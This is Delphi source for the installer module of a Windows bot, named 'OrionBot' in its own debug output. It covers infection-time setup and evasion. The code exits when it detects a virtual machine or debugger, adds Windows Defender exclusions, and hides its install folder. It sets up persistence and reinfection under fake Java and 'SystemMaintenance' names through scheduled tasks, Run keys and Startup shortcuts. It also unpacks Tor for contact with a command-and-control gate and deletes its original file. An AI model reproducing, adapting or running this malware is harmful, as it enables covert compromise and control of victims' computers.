unit BotUnit;

{
  This unit handles tasks specific to the binary itself, such as
  installation, loading and parsing of settings, restarting, etc.
}

{$WARN SYMBOL_PLATFORM OFF}

interface

uses
  SysUtils, Classes,
  Windows, Registry,
  INIFiles, Zip,
  Basics, ElevateUnit, SystemUnit, SpreadUnit;


///  <summary>Ensures that only one instance is running</summary>
procedure CheckInstance;
///  <summary>Restarts the current application</summary>
///  <param name="FileName">Path of the file to start, usually our own application</param>
///  <param name="Force">If true, the procedure makes the application exit immediately</param>
///  <param name="DeleteMe">If true, restarts with the /delete parameter</param>
procedure Restart(FileName: String = ''; Force: Boolean = False;
  DeleteMe: Boolean = False);
///  <summary>Updates the bot by uninstalling it and executing the given file</summary>
procedure Update(FileName: String);
procedure Uninstall;
procedure Install;
///  <summary>Loads the settings stored in the Config file and sets Basics.Options accordingly</summary>
procedure LoadSettings;
function IsFirstStart: Boolean;

implementation

procedure CheckInstance;
var
  H: THandle;
Begin
  H := CreateMutex(Nil, True, 'WhatHaveWeDone');
  if (H = 0) or (GetLastError = ERROR_ALREADY_EXISTS) then
    Halt(0);
End;

procedure Update(FileName: String);
var
  S: String;
Begin
  Dbg('Updating.');
  FileSetAttr(ParamStr(0), faNormal);
  FileSetAttr(Options.BaseDir, faNormal);
  S := Format(DeleteCmd, [Options.BaseDir]);
  Delete(S, Length(S), 1);
  S := S + '; ' + Format(StartProcCmd, [FileName]) + '"';
  ChDir('..');
  PowerShell(S);
End;

procedure Uninstall;
var
  IsAdmin: Boolean;
  S: String;
  R: TRegistry;
Begin
  Dbg('Uninstalling.', dHigh);
  Task.Remove('JavaInvoker');
  Task.Remove('JDebug');
  IsAdmin := IsUserAnAdmin;
  R := TRegistry.Create(KEY_WRITE OR KEY_WOW64_64KEY);
  try
    if IsAdmin then
      R.RootKey := HKEY_LOCAL_MACHINE
    else
      R.RootKey := HKEY_CURRENT_USER;
    R.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
    R.DeleteKey('JavaInvoker');
  except
  end;
  R.Free;
  if IsAdmin then
    S := GetEnvironmentVariable('ProgramData') +
      '\Microsoft\Windows\Start Menu\Programs\StartUp'
  else
    S := GetEnvironmentVariable('AppData') +
      '\Microsoft\Windows\Start Menu\Programs\Startup';
  S := S + '\Java Invoker.lnk';
  SysUtils.DeleteFile(S);
  FileSetAttr(ParamStr(0), faNormal);
  FileSetAttr(Options.BaseDir, faNormal);
  ChDir('..');
  Dbg('Uninstall complete.', dSuccess);
  PowerShell(Format(DeleteCmd, [Options.BaseDir]));
End;

procedure Restart(FileName: String = ''; Force: Boolean = False;
  DeleteMe: Boolean = False);
var
  S: Array of String;
Begin
  Dbg('Restarting (Force: ' + BoolToStr(Force, True) + ', DeleteMe: ' +
  BoolToStr(DeleteMe, True) + ').', dHigh);
  if FileName = '' then
    FileName := ParamStr(0);
  SetLength(S, 1);
  S[0] := '/wait';
  if DeleteMe then
  Begin
    SetLength(S, 3);
    S[1] := '/delete';
    S[2] := '"' + ParamStr(0) + '"';
  End;
  Execute(FileName, S);
  if Force then
    Halt(0);
End;

function ExpandBaseDir(X: Integer): String;
Begin
  case X of
    1:
      Result := GetEnvironmentVariable('Temp');
    2:
      Result := GetEnvironmentVariable('UserProfile') + '\Desktop';
    3:
      Result := GetEnvironmentVariable('UserProfile') + '\Saved Games';
    4:
      Result := GetEnvironmentVariable('ProgramFiles');
    5:
      Result := GetEnvironmentVariable('Windir');
  else
    Result := GetEnvironmentVariable('AppData');
  end;
  Result := IncludeTrailingPathDelimiter(Result);
End;

procedure LoadFromResource(M: TMemoryStream; ResName: String);
var
  R: TResourceStream;
Begin
  R := TResourceStream.Create(HInstance, ResName, RT_RCDATA);
  R.Position := 0;
  M.LoadFromStream(R);
  R.Free;
End;

procedure ExtractTor(J: TMemINIFile; N: String);
var
  A, S: String;
  M: TMemoryStream;
Begin
  S := ExtractFilePath(N);
  A := J.ReadString('Install', 'TorRes', '');
  if A <> '' then
  Begin
    M := TMemoryStream.Create;
    LoadFromResource(M, A);
    M.SaveToFile(S + 'Tor.zip');
    M.Free;
    try
      TZipFile.ExtractZipFile(S + 'Tor.zip', S);
      // Causes a memory leak for some weird reason
    except
    end;
    SysUtils.DeleteFile(S + 'Tor.zip');
  End;
  Dbg('Tor extracted.');
End;

function BaseSetup(J: TMemINIFile; M: TMemoryStream): String;
var
  A: String;
Begin
  Result := ExpandBaseDir(J.ReadInteger('Install', 'BaseLocation', 0)) +
    J.ReadString('Install', 'BaseName', 'Bot');
  ForceDirectories(Result);
  if J.ReadBool('Install', 'Windef', False) then
  Begin
    DefenderExclusion(ExtractFileDir(ParamStr(0)), True);
    DefenderExclusion(Result, True);
  End;
  if J.ReadBool('Install', 'Hide', True) then
    FileSetAttr(Result, faHidden or faSysFile);
  Result := Result + '\';
  J.WriteString('General', 'BaseDir', Copy(Result, 1, Length(Result) - 1));
  A := GetGUID;
  J.WriteString('General', 'GUID', A);
  A := J.ReadString('Install', 'Prefix', 'Bot-') + Copy(A, 1, 6);
  J.WriteString('General', 'Name', A);
  J.UpdateFile;
  Crypt(M);
  M.SaveToFile(Result + ConfigFile);

  Result := Result + J.ReadString('Install', 'ExeName', 'bot.exe');
  CopyFile(PChar(ParamStr(0)), PChar(Result), False);
End;

function IntToBin(I: Integer): string;
begin
  Result := '';
  while I > 0 do
  begin
    Result := Chr(Ord('0') + (I and 1)) + Result;
    I := I shr 1;
  end;
  while Length(Result) < 32 do
    Result := '0' + Result;
end;

procedure AntiV;
var
  O, T: TOUI;
  I, J: LongInt;
Begin
  O := GetOUI;
  I := 0;
  while I < High(VirtualMAC) do
  Begin
    for J := 0 to 2 do
      T[J] := VirtualMAC[I + J];
    if OUIEquals(O, T) then
    Begin
      Dbg('AntiV identified pattern no. ' + IntToStr(I), dWarn);
      Halt(0);
    End;
    Inc(I, 3);
  End;
End;

procedure AntiD;
type
  TDbgProc = function(): BOOL; stdcall;
  TDbgProc2 = function(H: THandle; B: PBOOL): BOOL; stdcall;
var
  IsDbg: TDbgProc;
  IsDbg2: TDbgProc2;
  H: THandle;
  B: BOOL;
Begin
  try
    H := LoadLibrary('kernel32.dll');
    if H <> 0 then
    Begin
      IsDbg := GetProcAddress(H, 'IsDebuggerPresent');
      IsDbg2 := GetProcAddress(H, 'CheckRemoteDebuggerPresent');
    End
    else
      Exit;
    FreeLibrary(H);
    if IsDbg then
      Halt;
    IsDbg2(GetCurrentProcess(), @B);
    if B then
      Halt;
  except
  end;
End;

procedure PersistenceSetup(J: TMemINIFile; N: String);
var
  I: Integer;
  A, P, IsAdmin: Boolean; // Automatic, Can Establish Persistence
  T: TTaskOptions;
  R: TRegistry;
  S: String;
Begin
  I := J.ReadInteger('Install', 'Startup', 1);
  A := (I = 1);
  P := True;
  IsAdmin := IsUserAnAdmin;
  With T do
  Begin
    Name := 'JavaInvoker';
    Desc := 'Java Interface Invoker';
    Command := N;
    Param := '/startup';
    Dir := ExtractFilePath(N);
  end;
  // Startup
  if A or (I = 2) then
  Begin
    if IsAdmin then
      T.Trigger := LogonTask
    else
    Begin
      T.Trigger := MinTask;
      P := False;
    End;
    if Task.Create(T) then
    Begin
      A := False; // Added to startup using the Scheduled Task method
      Dbg('Startup entry created: Task');
    end
    else
      Dbg('Failed to create Startup entry: Task', dWarn);
  End;
  if A or (I = 3) then
  Begin
    A := False;
    R := TRegistry.Create(KEY_WRITE OR KEY_WOW64_64KEY);
    try
      if IsAdmin then
        R.RootKey := HKEY_LOCAL_MACHINE
      else
        R.RootKey := HKEY_CURRENT_USER;
      R.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
      R.WriteString('JavaInvoker', '"' + N + '" /startup');
      Dbg('Startup entry created: Registry');
    except
      A := True;
      Dbg('Failed to create Startup entry: Registry', dWarn);
    end;
    R.Free;
  End;
  if A or (I = 4) then
  Begin
    if IsAdmin then
      S := GetEnvironmentVariable('ProgramData') +
        '\Microsoft\Windows\Start Menu\Programs\StartUp'
    else
      S := GetEnvironmentVariable('AppData') +
        '\Microsoft\Windows\Start Menu\Programs\Startup';
    S := S + '\Java Invoker.lnk';
    CreateLink(N, '', 'Java Interface Invoker', '/startup');
    Dbg('Startup entry created: Folder');
  End;
  // Persistence
  if P then
    if J.ReadBool('Install', 'Persistence', True) then
    Begin
      T.Name := 'JDebug';
      T.Param := '/persistence';
      T.Trigger := MinTask;
      if Task.Create(T) then
        Dbg('Persistence entry created.')
      else
        Dbg('Failed to create persistence entry.');
    End;
  // Reinfect
  if J.ReadBool('Install', 'Reinfect', False) then
  Begin
    T.Name := 'SystemMaintenance';
    T.Param := Format(RIPayloadCmd, [J.ReadString('Install', 'RIPayload', '')]);
    T.Trigger := RITask;
    if Task.Create(T) then
      Dbg('Reinfect entry created.')
    else
      Dbg('Failed to create reinfect entry.');
  End;
End;

procedure Install;
var
  M: TMemoryStream;
  J: TMemINIFile;
  N: String; // Main executable
Begin
  Dbg('First start, installing.', dHigh);
  M := TMemoryStream.Create;
  LoadFromResource(M, ConfigRes);
  Crypt(M, False);
  M.Position := 0;
  J := TMemINIFile.Create(M);
  if J.ReadBool('Install', 'AntiV', False) then
    AntiV;
  if J.ReadBool('Install', 'AntiD', False) then
    AntiD;
  if J.ReadBool('Install', 'Sleep', False) then
    Sleep(30000);
  Dbg('Antis passed.');
  Elevate(TElevationType(J.ReadInteger('Install', 'Elevate', 0)));
  Dbg('Elevation check passed.');
  N := BaseSetup(J, M);
  Dbg('Base: ' + J.ReadString('General', 'BaseDir', 'None??'));
  M.Free;
  if J.ReadBool('Server', 'Tor', True) then
    ExtractTor(J, N);
  PersistenceSetup(J, N);
  Dbg('Persistence module passed.');
  Restart(N, False, J.ReadBool('Install', 'Melt', False));
  J.Free;
  Dbg('Install completed.', dSuccess);
End;

procedure LoadSettings;
var
  Mem: TMemoryStream;
  J: TMemINIFile;
Begin
  Mem := TMemoryStream.Create;
  Mem.LoadFromFile(ConfigFile);
  Crypt(Mem, False);
  Mem.Position := 0;
  J := TMemINIFile.Create(Mem);
  Mem.Free;
  Options.BaseDir := J.ReadString('General', 'BaseDir', 'Bot');
  Options.GUID := J.ReadString('General', 'GUID',
    'DEAA2E50-0355-40F4-9338-4D7507BBFEFF');
  Options.Name := J.ReadString('General', 'Name', 'Bot-BADF00');
  // Read connection options
  Options.Gate := J.ReadString('Server', 'Gate', 'https://localhost:1337/');
  Options.Tor := J.ReadBool('Server', 'Tor', True);
  // Read infection options
  Options.Version := J.ReadString('Install', 'Version', '1.0');
  Options.Owner := J.ReadString('Install', 'Owner', 'Unknown');
  Options.Method := J.ReadString('Install', 'Method', 'Unknown');
  J.Free;

  Dbg('OrionBot v' + Options.Version + ' started!', dHigh);
End;

function IsFirstStart: Boolean;
Begin
  Result := Not(FileExists(ConfigFile));
End;

end.
